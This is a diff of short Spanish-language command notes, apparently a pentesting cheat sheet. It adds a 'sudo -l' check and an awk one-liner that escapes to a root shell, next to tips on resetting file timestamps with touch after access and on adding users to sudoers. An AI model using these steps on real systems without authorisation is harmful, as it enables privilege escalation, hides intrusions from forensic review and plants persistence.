@@ -1,5 +1,9 @@
 Para escribir sin editor de texto: "cat << EOF > archivoACrear", y escribimos lo que queramos. Finalizar con EOF
 
+sudo -l Para ver si el usuario puede ejecutar algo como root
+
+awk 'BEGIN {system("/bin/sh")}' Para sacar shell si se tienen permisos con awk pro alguna razón
+
 Antes de acceder a un fichero, apuntar su timestamp y luego volver a modificarlo con touch
 
 Si queremos agregar algun usuario a sudoers, visudo y debajo de root ALL=(ALL:ALL) ALL poner lo mismo pero con nombre del usuario
